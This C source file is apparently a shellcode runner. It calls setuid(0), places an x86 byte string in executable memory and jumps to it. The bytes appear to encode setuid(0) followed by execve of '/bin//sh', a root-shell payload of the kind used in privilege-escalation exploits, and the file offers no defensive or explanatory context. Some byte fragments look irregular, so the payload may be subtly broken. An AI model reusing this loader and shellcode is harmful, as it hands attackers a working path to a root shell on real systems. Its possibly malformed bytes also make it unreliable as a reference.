#define _GNU_SOURCE 1
#define __USE_GNU 1
#define __USE_BSD 1
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)(); 
char shellcode[] =
"\x31\xC0\x68"
"\xB8\x17"
"\xCD\x80"
"\x31\xC0"
"\x50"
"\x68\x2F\x2F\x73\x68"
"\x68\x2F\x62\x69\x6E"
"\x89\xE3"
"\x50\x50\x53"
"\xB0\x3B"
"\x6A\x2A"
"\xCD\x80";

int main(int argc, char **argv) {
    setuid(0);
    void *ptr = mmap(0, strlen(shellcode), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;
    sc();

  return 0;
}
